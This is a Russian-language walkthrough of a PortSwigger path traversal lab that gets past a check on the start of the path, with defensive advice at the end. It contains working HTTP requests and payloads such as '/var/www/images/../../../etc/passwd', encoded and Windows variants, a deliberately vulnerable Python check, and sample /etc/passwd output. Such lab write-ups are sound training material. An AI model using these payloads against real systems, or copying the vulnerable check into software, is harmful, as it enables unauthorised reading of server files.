# 📘 PortSwigger Lab: File Path Traversal, Validation of Start of Path

<a id="top"></a>

> 🔗 Лабораторная работа: https://portswigger.net/web-security/file-path-traversal/lab-validation-of-start-of-path  
> 🎯 Тема: Path Traversal — обход проверки начала пути  
> 🧪 Уровень: Practitioner  
> ✅ Статус: Solved  

---

## 📑 Содержание

- [🎯 Цель](#goal)
- [🧠 Краткая теория](#theory)
- [🧩 Ключевая идея](#idea)
- [📁 Что такое Path Traversal](#path-traversal)
- [🧹 Что означает «проверка начала пути»](#start-validation)
- [🔬 Как формируется рабочий payload](#payload-building)
- [🗂 Как приложение загружает изображения](#images)
- [❌ Уязвимая логика проверки](#vulnerable-flow)
- [🔍 Шаг 1 — Найти запрос изображения](#step1)
- [🔍 Шаг 2 — Отправить запрос в Repeater](#step2)
- [🔍 Шаг 3 — Проверить обычный traversal](#step3)
- [🔍 Шаг 4 — Проверить абсолютный путь](#step4)
- [🔍 Шаг 5 — Объединить префикс и traversal](#step5)
- [🔍 Шаг 6 — Прочитать `/etc/passwd`](#step6)
- [📨 Пример исходного запроса](#original-request)
- [📨 Пример модифицированного запроса](#modified-request)
- [📥 Пример результата](#response)
- [🧾 Полная цепочка атаки](#attack-chain)
- [🔬 Почему атака сработала](#breakdown)
- [🧭 Как нормализуется путь](#normalization)
- [🐧 Почему используется `/etc/passwd`](#passwd)
- [🧠 Как думать как пентестер](#pentester)
- [🧪 Дополнительные проверки](#additional-tests)
- [❌ Типичные ошибки](#mistakes)
- [🛡 Защита](#defense)
- [✅ Чек-лист](#checklist)
- [🧾 Итог](#conclusion)

---

<a id="goal"></a>

## 🎯 Цель

Использовать уязвимость **File Path Traversal** в механизме отображения изображений товаров и получить содержимое системного файла:

```text
/etc/passwd
```

Приложение передаёт **полный путь к файлу** через параметр запроса и проверяет, что переданный путь **начинается с ожидаемой папки**:

```text
/var/www/images/
```

Для обхода проверки в параметр:

```text
filename
```

передаётся значение:

```text
/var/www/images/../../../etc/passwd
```

Путь проходит проверку `startswith`, а после нормализации файловой системой превращается в:

```text
/etc/passwd
```

---

<a id="theory"></a>

## 🧠 Краткая теория

**Path Traversal** — это уязвимость, при которой пользователь может влиять на путь к файлу, читаемому сервером.

В этой лаборатории приложение не строит путь из имени файла — оно принимает **весь путь** от клиента и проверяет его начало:

```text
filename=/var/www/images/58.jpg
```

Предположение разработчика:

```text
Если путь начинается с /var/www/images/, он остаётся внутри каталога изображений.
```

Ошибка в том, что строковая проверка (`startswith`) — это **не проверка файловой системы**. ОС раскрывает последовательности `../` только в момент открытия файла, и тогда путь нормализуется:

```text
/var/www/images/../../../etc/passwd
        ↓ нормализация ОС
/etc/passwd
```

---

<a id="idea"></a>

## 🧩 Ключевая идея

Стандартный payload без префикса:

```text
../../../etc/passwd
```

отклоняется, потому что **не начинается** с `/var/www/images/`.

Рабочий payload **включает требуемый префикс**, а затем «съедает» его traversal-последовательностями:

```text
/var/www/images/../../../etc/passwd
```

Обработка:

```text
Проверка:     начинается с "/var/www/images/"  →  проходит ✅
Файловая система: /var/www/images/../../../etc/passwd  →  /etc/passwd
```

Разработчик проверяет **строку**. ОС интерпретирует **путь**. Между этими двумя моментами `../` удаляет префикс каталог за каталогом.

---

<a id="path-traversal"></a>

## 📁 Что такое Path Traversal

Path Traversal также называют:

```text
Directory Traversal
```

или:

```text
dot-dot-slash attack
```

Основная последовательность для Linux/Unix:

```text
../
```

означает:

```text
перейти в родительский каталог
```

Пример исходного каталога:

```text
/var/www/images/
```

После одного перехода:

```text
/var/www/
```

После двух:

```text
/var/
```

После трёх:

```text
/
```

Из корня атакующий может обратиться к:

```text
/etc/passwd
```

---

<a id="start-validation"></a>

## 🧹 Что означает «проверка начала пути»

Приложение требует, чтобы переданный пользователем путь начинался с ожидаемой базовой папки:

```text
/var/www/images/
```

Упрощённая проверка:

```python
if not filename.startswith("/var/www/images/"):
    return "Access denied"
```

Это блокирует:

```text
filename=../../../etc/passwd
```

потому что строка не начинается с требуемого префикса.

Но проверка сравнивает только **текст**. Она не понимает, что:

```text
/var/www/images/../../../etc/passwd
```

одновременно начинается с префикса **и** выходит за пределы папки. Оба факта верны в одно и то же время.

---

<a id="payload-building"></a>

## 🔬 Как формируется рабочий payload

Берём требуемый префикс:

```text
/var/www/images/
```

Добавляем три перехода вверх:

```text
../../..
```

Добавляем целевой файл:

```text
/etc/passwd
```

Результат:

```text
/var/www/images/../../../etc/passwd
```

Разрешение пути:

```text
/var/www/images/../   → /var/www/
/var/www/images/../../ → /var/
/var/www/images/../../../ → /
```

Затем к корню добавляется:

```text
/etc/passwd
```

Итоговый нормализованный путь:

```text
/etc/passwd
```

---

<a id="images"></a>

## 🗂 Как приложение загружает изображения

Лаборатория содержит уязвимость в функции отображения изображений товаров.

Когда пользователь открывает страницу товара, браузер отправляет отдельный запрос:

```http
GET /image?filename=/var/www/images/58.jpg HTTP/2
Host: LAB-ID.web-security-academy.net
```

Параметр:

```text
filename
```

теперь содержит **полный путь**, а не только имя. Сервер проверяет префикс и читает файл по этому пути.

---

<a id="vulnerable-flow"></a>

## ❌ Уязвимая логика проверки

Упрощённая уязвимая реализация:

```python
filename = request.args.get("filename")
if not filename.startswith("/var/www/images/"):
    return "Access denied"

path = filename
return open(path, "rb").read()
```

Уязвимая схема:

```text
Пользовательский полный путь
        ↓
startswith("/var/www/images/") — проходит
        ↓
Путь используется как есть
        ↓
Нормализация файловой системой раскрывает ../../
        ↓
Чтение /etc/passwd
```

---

<a id="step1"></a>

## 🔍 Шаг 1 — Найти запрос изображения

1. Открыть лабораторию.
2. Перейти на страницу любого товара.
3. Запустить Burp Suite.
4. Открыть:

```text
Proxy → HTTP history
```

5. Найти запрос изображения:

```http
GET /image?filename=/var/www/images/58.jpg HTTP/2
Host: LAB-ID.web-security-academy.net
```

Обратите внимание: значение — уже полный путь, а не только имя файла.

---

<a id="step2"></a>

## 🔍 Шаг 2 — Отправить запрос в Repeater

На запросе выполнить:

```text
Send to Repeater
```

Burp Repeater позволяет:

- изменять значение `filename`;
- повторно отправлять запрос;
- сравнивать статус и длину ответа;
- просматривать тело ответа.

---

<a id="step3"></a>

## 🔍 Шаг 3 — Проверить обычный traversal

Заменить значение на обычный traversal payload:

```text
../../../etc/passwd
```

Запрос:

```http
GET /image?filename=../../../etc/passwd HTTP/2
Host: LAB-ID.web-security-academy.net
```

Ожидаемый результат: запрос отклонён или файл не возвращается, потому что путь не начинается с `/var/www/images/`.

Вывод: проверка префикса существует.

---

<a id="step4"></a>

## 🔍 Шаг 4 — Проверить абсолютный путь

Попробовать прямой абсолютный путь:

```text
/etc/passwd
```

Запрос:

```http
GET /image?filename=/etc/passwd HTTP/2
Host: LAB-ID.web-security-academy.net
```

Тоже заблокировано: `/etc/passwd` не начинается с `/var/www/images/`.

Следующий вопрос пентестера:

```text
Принимает ли приложение полный путь и проверяет только его начало?
```

Если да — префикс можно включить прямо в payload.

---

<a id="step5"></a>

## 🔍 Шаг 5 — Объединить префикс и traversal

Заменить значение параметра `filename` на:

```text
/var/www/images/../../../etc/passwd
```

Модифицированный запрос:

```http
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
Host: LAB-ID.web-security-academy.net
```

Отправить запрос кнопкой:

```text
Send
```

Логика:

```text
startsWith("/var/www/images/")  →  True ✅
нормализация                   →  /etc/passwd
```

---

<a id="step6"></a>

## 🔍 Шаг 6 — Прочитать `/etc/passwd`

В HTTP-ответе вместо данных изображения появляется содержимое системного файла:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

После успешного запроса лаборатория получает статус:

```text
Solved
```

---

<a id="original-request"></a>

## 📨 Пример исходного запроса

```http
GET /image?filename=/var/www/images/58.jpg HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION-VALUE
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
```

Клиент контролирует полный путь в параметре:

```text
filename
```

---

<a id="modified-request"></a>

## 📨 Пример модифицированного запроса

```http
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION-VALUE
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
```

Критический payload:

```text
/var/www/images/../../../etc/passwd
```

---

<a id="response"></a>

## 📥 Пример результата

```http
HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316
```

Тело ответа (фрагмент):

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
```

В полном ответе — все стандартные записи `/etc/passwd`, что является полным доказательством произвольного чтения файлов.

---

<a id="attack-chain"></a>

## 🧾 Полная цепочка атаки

```text
1. Открыть лабораторию PortSwigger
2. Перейти на страницу товара
3. Найти запрос /image?filename=... в Burp HTTP history
4. Отправить запрос в Repeater
5. Убедиться, что обычный ../../../etc/passwd блокируется
6. Убедиться, что абсолютный путь /etc/passwd блокируется
7. Сделать вывод: проверяется только начало пути
8. Включить требуемый префикс в payload
9. Передать /var/www/images/../../../etc/passwd
10. Получить содержимое /etc/passwd
11. Убедиться, что лаборатория отмечена как Solved
```

---

<a id="breakdown"></a>

## 🔬 Почему атака сработала

### 1. Клиент контролирует полный путь

Приложение принимает полный путь в параметре `filename` вместо идентификатора файла.

### 2. Защита проверяет текст, а не итоговый путь

`startswith()` — это строковое сравнение. Оно ничего не знает о семантике `..`.

### 3. Префикс можно включить в payload

Ничто не мешает добавить после легитимного префикса traversal-последовательности.

### 4. ОС нормализует путь

Сегменты `..` раскрываются в момент открытия файла — уже после прохождения проверки.

### 5. Итоговый путь не проверяется повторно

Приложение не проверяет, что нормализованный путь остался внутри базового каталога.

### 6. Процесс может читать файл

Веб-приложение имеет право читать `/etc/passwd`, поэтому содержимое возвращается.

---

<a id="normalization"></a>

## 🧭 Как нормализуется путь

```text
/var/www/images/../../../etc/passwd

шаг 1: /var/www/images/../  →  /var/www/
шаг 2: /var/www/../         →  /var/
шаг 3: /var/../             →  /
шаг 4: / + etc/passwd       →  /etc/passwd
```

Результат:

```text
/etc/passwd
```

Для более глубоких каталогов работает та же логика — нужно лишь добавить больше сегментов `../`.

---

<a id="passwd"></a>

## 🐧 Почему используется `/etc/passwd`

`/etc/passwd` — стандартный файл Linux/Unix с информацией о локальных учётных записях.

Формат строки:

```text
username:x:UID:GID:comment:home:shell
```

Пример:

```text
root:x:0:0:root:/root:/bin/bash
```

Обычно он **не содержит** хеши паролей (они в `/etc/shadow`), поэтому безопасно используется как доказательство произвольного чтения файлов.

---

<a id="pentester"></a>

## 🧠 Как думать как пентестер

Когда приложение проверяет путь, спрашивайте:

```text
Проверяется строка или итоговый путь?
```

```text
Можно ли включить требуемый префикс в payload?
```

```text
Сколько сегментов ../ нужно до корня?
```

```text
Принимается ли полный путь от клиента вообще?
```

Последовательность тестов:

```text
1. Нормальное значение: /var/www/images/58.jpg
2. Обычный traversal: ../../../etc/passwd
3. Абсолютный путь: /etc/passwd
4. Префикс + traversal: /var/www/images/../../../etc/passwd
5. Перебрать количество сегментов ../
6. Сравнить тело ответа, статус и длину
```

---

<a id="additional-tests"></a>

## 🧪 Дополнительные проверки

В рамках разрешённой лаборатории сравните:

### Префикс + 2 перехода

```text
/var/www/images/../../etc/passwd
```

### Префикс + 3 перехода (работает)

```text
/var/www/images/../../../etc/passwd
```

### Префикс + 4 перехода (перебор)

```text
/var/www/images/../../../../etc/passwd
```

### Кодированный traversal внутри префикса

```text
/var/www/images/..%2f..%2f..%2fetc/passwd
```

### Windows-вариант

```text
C:\var\www\images\..\..\..\windows\win.ini
```

Рабочий вариант для данной лаборатории:

```text
/var/www/images/../../../etc/passwd
```

---

<a id="mistakes"></a>

## ❌ Типичные ошибки

### Ошибка 1. Использовать traversal без префикса

`../../../etc/passwd` блокируется — путь должен начинаться с базовой папки.

### Ошибка 2. Использовать только абсолютный путь

`/etc/passwd` тоже блокируется по той же причине.

### Ошибка 3. Неверное количество сегментов `../`

Слишком мало сегментов — путь останется внутри `/var/www/...`; точное количество должно соответствовать глубине каталога.

### Ошибка 4. Забывать, что ОС нормализует пути

Строковая проверка и разрешение пути файловой системой — разные этапы.

### Ошибка 5. Смотреть только на статус-код

И успех, и отказ могут возвращать `200 OK`. Анализируйте тело ответа.

### Ошибка 6. Ожидать JPEG

После эксплуатации ответ содержит текст `/etc/passwd`.

---

<a id="defense"></a>

## 🛡 Защита

### 1. Не принимать путь от клиента

Использовать идентификатор:

```text
image_id=58
```

и маппить его на сервере:

```python
allowed_images = {
    "58": "58.jpg",
    "59": "59.jpg",
}
```

### 2. Использовать allowlist

```python
if filename not in allowed_filenames:
    reject_request()
```

### 3. Нормализовать и проверять итоговый путь

```python
base = os.path.realpath("/var/www/images")
target = os.path.realpath(os.path.join(base, user_input))
if not target.startswith(base + os.sep):
    reject_request()
```

### 4. Использовать `basename` как дополнительную меру

```python
filename = os.path.basename(user_input)
```

### 5. Применять минимальные права

Веб-процесс должен уметь читать только необходимые файлы.

### 6. Логировать подозрительные значения

```text
../
/var/www/images/../../
%2e%2e%2f
```

---

<a id="checklist"></a>

## ✅ Чек-лист

### Разведка

- [ ] Открыта страница товара
- [ ] Найден запрос `/image?filename=...`
- [ ] Определён параметр полного пути
- [ ] Запрос отправлен в Repeater

### Анализ проверки

- [ ] Проверен обычный `../../../etc/passwd` — заблокирован
- [ ] Проверен абсолютный `/etc/passwd` — заблокирован
- [ ] Сделан вывод: проверяется только начало пути

### Эксплуатация

- [ ] Использован `/var/www/images/../../../etc/passwd`
- [ ] Ответ содержит данные `/etc/passwd`
- [ ] Подтверждено произвольное чтение файла
- [ ] Лаборатория получила статус Solved

---

<a id="conclusion"></a>

## 🧾 Итог

Приложение проверяло, что переданный путь **начинается** с `/var/www/images/`, но никогда не проверяло, где этот путь **заканчивается после нормализации**.

Payload:

```text
/var/www/images/../../../etc/passwd
```

прошёл проверку префикса и был нормализован файловой системой до:

```text
/etc/passwd
```

Главные выводы:

```text
Строковая проверка — это не проверка пути.
```

```text
Валидация должна выполняться над итоговым каноническим путём, а не над сырым вводом.
```

```text
Нормализованный путь обязан оставаться внутри разрешённой базовой директории.
```

---

[⬆ Вернуться к началу](#top)
